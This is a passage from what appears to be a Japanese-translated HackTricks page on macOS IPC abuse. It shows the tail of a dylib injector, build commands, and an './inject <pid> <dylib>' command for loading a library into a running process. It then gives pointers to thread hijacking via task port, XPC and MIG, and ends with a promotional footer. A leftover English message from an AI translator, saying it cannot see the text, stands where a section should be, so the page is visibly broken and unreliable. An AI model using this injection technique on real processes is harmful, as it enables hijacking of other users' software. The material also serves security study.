if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
Since the provided text is not visible, I'm unable to translate it. Please provide the text you would like to have translated into Japanese.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### スレッドハイジャック via タスクポート <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

この技術ではプロセスのスレッドがハイジャックされます:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 基本情報

XPCは、macOSとiOSで使用されるカーネルであるXNUのInter-Process Communicationの略です。XPCは、システム上の異なるプロセス間で**安全で非同期なメソッド呼び出しを行うためのメカニズム**を提供します。これはAppleのセキュリティパラダイムの一部であり、各**コンポーネント**がその仕事をするために必要な**許可だけを持って実行される**特権分離アプリケーションの**作成を可能にし**、侵害されたプロセスからの潜在的な損害を制限します。

この**通信がどのように機能するか**、またそれが**どのように脆弱性になり得るか**についての詳細は以下をチェックしてください:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIGは、Mach IPCコード作成のプロセスを**簡素化するために作られました**。基本的には、与えられた定義でサーバーとクライアントが通信するために必要なコードを**生成します**。生成されたコードが見苦しい場合でも、開発者はそれをインポートするだけで、以前よりもはるかにシンプルなコードを持つことができます。

詳細は以下をチェックしてください:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## 参考文献

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
